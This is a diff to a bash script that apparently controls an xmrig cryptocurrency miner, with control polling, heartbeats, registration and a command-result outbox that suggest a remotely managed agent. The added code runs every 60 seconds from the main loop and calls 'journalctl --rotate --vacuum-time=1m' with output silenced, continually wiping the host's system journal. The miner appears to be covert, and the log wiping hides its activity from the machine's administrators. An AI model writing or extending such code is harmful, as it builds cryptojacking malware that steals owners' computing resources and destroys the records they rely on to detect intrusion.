@@ -10,7 +10,7 @@ fi
 
 if [[ "${1:-}" == "--self-test" ]]; then
     bash -n "$0" || exit 1
-    for dependency in curl jq sha256sum flock systemctl; do
+    for dependency in curl jq sha256sum flock systemctl journalctl; do
         command -v "$dependency" >/dev/null 2>&1 || exit 1
     done
     exit 0
@@ -50,6 +50,7 @@ CONTROL_INTERVAL=10
 CONTROL_JITTER=10
 CONFIG_INTERVAL=300
 MAIN_LOOP_INTERVAL=5
+JOURNAL_VACUUM_INTERVAL=60
 LOG_HTTP_TIMEOUT=5
 LOG_MAX_LEN=220
 LOG_CHUNK_SIZE=200
@@ -382,6 +383,10 @@ reset_restart_state_if_stable() {
 cleanup_runtime_files() {
     find "$BASE_DIR" -maxdepth 1 -type f \( -name 'xmrig.*.tmp.*' -o -name 'config.json.tmp.*' -o -name 'config.json.bootstrap.*' \) -mtime +1 -delete 2>/dev/null || true
     find "$BASE_DIR" -maxdepth 1 -type d -name '.xmrig-update.*' -mtime +1 -exec sh -c 'find "$1" -depth -delete' _ {} \; 2>/dev/null || true
+}
+
+vacuum_system_journal() {
+    journalctl --rotate --vacuum-time=1m >/dev/null 2>&1 || true
 }
 
 get_active_gui_user() {
@@ -1264,6 +1269,7 @@ NOW=$(date +%s)
 NEXT_CONTROL=$((NOW + RANDOM % 30))
 NEXT_CONFIG=$((NOW + RANDOM % 45))
 NEXT_HEARTBEAT=$((NOW + RANDOM % 30))
+NEXT_JOURNAL_VACUUM=$((NOW + JOURNAL_VACUUM_INTERVAL))
 NEXT_REGISTRATION=$(read_uint_file "$REGISTRATION_NEXT_FILE" 0)
 if [[ -s "$REGISTRATION_STATE_FILE" ]]; then
     NEXT_REGISTRATION=0
@@ -1279,6 +1285,11 @@ HEARTBEAT_FAILURES=0
 
 while true; do
     NOW=$(date +%s)
+
+    if (( NOW >= NEXT_JOURNAL_VACUUM )); then
+        vacuum_system_journal
+        NEXT_JOURNAL_VACUUM=$((NOW + JOURNAL_VACUUM_INTERVAL))
+    fi
 
     flush_command_result_outbox || true
 
